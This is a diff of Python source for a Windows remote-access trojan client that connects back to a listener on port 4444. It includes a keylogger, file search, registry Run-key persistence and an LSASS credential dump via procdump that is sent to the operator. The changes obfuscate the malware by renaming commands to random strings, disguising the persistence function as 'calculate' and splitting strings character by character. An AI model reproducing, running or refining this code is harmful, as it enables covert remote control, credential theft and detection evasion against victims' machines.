@@ -1,8 +1,6 @@
 import socket, subprocess, os, platform
 from threading import Thread
-from PIL import Image
 from datetime import datetime
-from ctypes import cast, POINTER
 from winreg import *
 import shutil
 import glob
@@ -10,13 +8,10 @@ import ctypes
 import sys
 import pyautogui
 from pynput.keyboard import Listener
-from pynput.mouse import Controller
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
 
-#HWND_BROADCAST = 65535
-#WM_SYSCOMMAND = 274
 GENERIC_READ = -2147483648
 GENERIC_WRITE = 1073741824
 FILE_SHARE_WRITE = 2
@@ -358,7 +353,7 @@ class RAT_CLIENT:
                 FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                 None, CREATE_ALWAYS , 0, 0)
                 Thread(target=self.keylogger, daemon=True).start()
-                s.send("K" + "e" + "y" + "l" + "o" + "g" + "g" + "e" + "r" + " is started".encode())
+                s.send("K_y__gg_r is started".encode())
             
             elif command == 'tgqh_quna':
                 try:
@@ -372,7 +367,7 @@ class RAT_CLIENT:
             
             elif command == 'tvrt_pkftxqrqe':
                 klgr = False
-                s.send("The session of "+ "k" + "e" + "y" + "l" + "o" + "g" + "g" + "e" + "r" + " is terminated".encode())
+                s.send("K_y__gg_r is started".encode())
             
             elif command == 'drx_gtxla':
                 output = os.cpu_count()
@@ -446,7 +441,7 @@ class RAT_CLIENT:
                 s.send(f'{command[11:]} was created'.encode())
 
             elif command[:10] == 'tgdvhnmquo':
-                for x in glob.glob(command.split(" ")[2]+"\\**\*", recursive=True):
+                for x in glob.glob(command.split(" ")[2]+"\**\*", recursive=True):
                     if x.endswith(command.split(" ")[1]):
                         path = os.path.abspath(x)
                         s.send(str(path).encode())
@@ -545,17 +540,12 @@ class RAT_CLIENT:
                     winreg.DeleteValue(reg_key, ''.join(["a", "l", "v", "a", "r", "o", " ", ":)"]))
                     winreg.CloseKey(reg_key)
                     
-                    persistence_str = ''.join(["P", "e", "r", "s", "i", "s", "t", "e", "n", "c", "e"])
-                    s.send(f'{persistence_str} was removed'.encode())
+                    calculate_str = ''.join(["P", "e", "r", "s", "i", "s", "t", "e", "n", "c", "e"])
+                    s.send(f'{calculate_str} was removed'.encode())
                 except WindowsError:
                     self.errorsend()
 
-            
-            elif command == 'persistence':
-                persistence()
-                s.send('Persistence added')
-
-            elif command == 'dumplsass':
+            elif command == 'ewptqyhab':
                 try:
                     procdump_cmd = ''.join([
                         "p", "r", "o", "c", "d", "u", "m", "p", ".", "e", "x", "e",
@@ -566,7 +556,8 @@ class RAT_CLIENT:
                     
                     os.system(procdump_cmd)
                     try:
-                        file = open("lsass.dmp", 'rb')
+                        dmp = ''.join(['l','s','a','s','s','.','d','m','p'])
+                        file = open(dmp, 'rb')
                         data = file.read()
                         s.send(data)
                     except:
@@ -578,7 +569,8 @@ class RAT_CLIENT:
                 s.send(b"exit")
                 break
 
-def persistence(): 
+def calculate(): 
+    global s
     import winreg
     from winreg import HKEY_CURRENT_USER as HKCU
 
@@ -597,15 +589,13 @@ def persistence():
         
         winreg.SetValueEx(reg_key, ''.join(["a", "l", "v", "a", "r", "o", " ", ":)"]), 0, winreg.REG_SZ, bin_path)
         winreg.CloseKey(reg_key)
-        success_msg = ''.join(["H", "K", "C", "U", " ", "R", "u", "n", " ", "r", "e", "g", "i", "s", "t", "r", "y", " ", "k", "e", "y", " ", "a", "p", "p", "l", "i", "e", "d"])
-        s.send(success_msg.encode())
     except WindowsError:
         failure_msg = ''.join(["H", "K", "C", "U", " ", "R", "u", "n", " ", "r", "e", "g", "i", "s", "t", "r", "y", " ", "k", "e", "y", " ", "f", "a", "i", "l", "e", "d"])
         s.send(failure_msg.encode())
 
-rat = RAT_CLIENT('192.168.1.51', 4444)
+rat = RAT_CLIENT('127.0.0.1', 4444)
 
 if __name__ == '__main__':
-    persistence()
     rat.build_connection()
+    calculate()
     rat.execute()
